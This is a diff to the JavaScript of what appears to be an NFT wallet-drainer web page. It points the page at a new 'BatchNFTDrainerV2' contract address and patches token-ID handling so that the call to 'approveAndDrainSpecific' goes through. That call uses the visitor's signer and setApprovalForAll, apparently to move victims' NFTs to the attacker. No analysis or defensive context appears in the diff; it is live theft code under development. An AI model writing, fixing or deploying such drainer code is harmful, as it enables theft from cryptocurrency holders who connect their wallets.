@@ -119,7 +119,7 @@
       "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604", // WGFake
       "0xc4b837Eb523A82F5214d43200af1491B93185979"  // HappyApeYC
     ];
-    const drainerContract = "0x627e275324101f3465C47EA51C3F6E04f7CA6F23"; // BatchNFTDrainerV2 address
+    const drainerContract = "0x3A0C897D86e0616dC5e1048CC27e5e61ba067C6F"; // BatchNFTDrainerV2 address
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -215,10 +215,17 @@
               }
             }
           }
-          tokenIdMatrix.push(ids);
+          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Fallback to [0] if no valid IDs
         }
 
-        // Call approveAndDrainSpecific only if there are valid token IDs
+        // Check if tokenIdMatrix has valid data
+        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr[0] !== 0);
+        if (!hasValidIds) {
+          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs or ensure NFTs are enumerable.";
+          return;
+        }
+
+        // Call approveAndDrainSpecific
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.approveAndDrainSpecific(nftContracts, tokenIdMatrix);
         await tx.wait();
